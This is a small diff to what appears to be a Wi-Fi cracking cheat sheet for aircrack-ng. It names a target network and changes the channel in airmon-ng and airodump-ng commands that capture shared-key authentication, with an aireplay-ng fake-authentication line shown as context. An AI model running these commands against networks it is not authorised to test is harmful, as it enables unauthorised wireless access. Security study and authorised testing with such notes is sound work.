@@ -3,6 +3,7 @@
 In this example
 - `wlan0` is the name of your interface in manager mode
 - `mon0` is the name of your interface in monitor mode
+- `teddy` is the name of your target network
 - `00:14:6C:7E:40:80` is the bssid of target network
 - `00:09:5B:EB:C5:2B` is the bssid of your network
 - `-c X` is the channel of target network
@@ -131,8 +132,8 @@ aireplay-ng -1 6000 -o 1 -q 10 -e teddy -a 00:14:6C:7E:40:80 -h 00:09:5B:EB:C5:2
 Start interface monitor mode on AP channel
 
 ```
-airmon-ng start wlan0 9
-airodump-ng -c 9 --bssid 00:14:6C:7E:40:80 -w sharedkey mon0
+airmon-ng start wlan0 6
+airodump-ng -c 6 --bssid 00:14:6C:7E:40:80 -w sharedkey mon0
 (wait AUTH=SKA)
 ls
 ```
